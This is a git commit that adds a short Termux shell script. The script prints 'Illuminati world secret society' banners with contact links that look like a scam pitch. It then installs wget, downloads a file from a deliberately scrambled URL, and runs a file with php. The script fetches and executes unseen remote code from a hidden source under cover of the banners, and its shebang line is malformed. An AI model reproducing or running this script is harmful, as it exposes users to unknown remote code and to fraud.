76dd721bb23dfde6d1f34c4580defccf051ac1c8
Gajendrsingh7748 <80196896+Gajendrsingh@users.noreply.github.com>
2021-08-06 07:48:52 +0530

    Add files via upload

---
+++ cc.sh
@@ -0,0 +1,16 @@
+#!/data/data/com.termux
+
+
+sleep 2
+figlet Illuminati world secret society
+figlet https://t.me/joinchat/v1UBTdiM1ZZhNjdh
+figlet https://youtube.com/channel/UCLGRNqwl...
+figlet contact me :
+figlet illuminatiworldsecretsociety@gmail.com
+figlet whatsaap Number https://api.whatsapp.com/send?phone=1...
+
+sleep 2
+pkg install wget
+sleep 1
+wget  sggkh://kzhgvyrm.xln/izd/XNJbTmuM 
+php CMQyGnfN
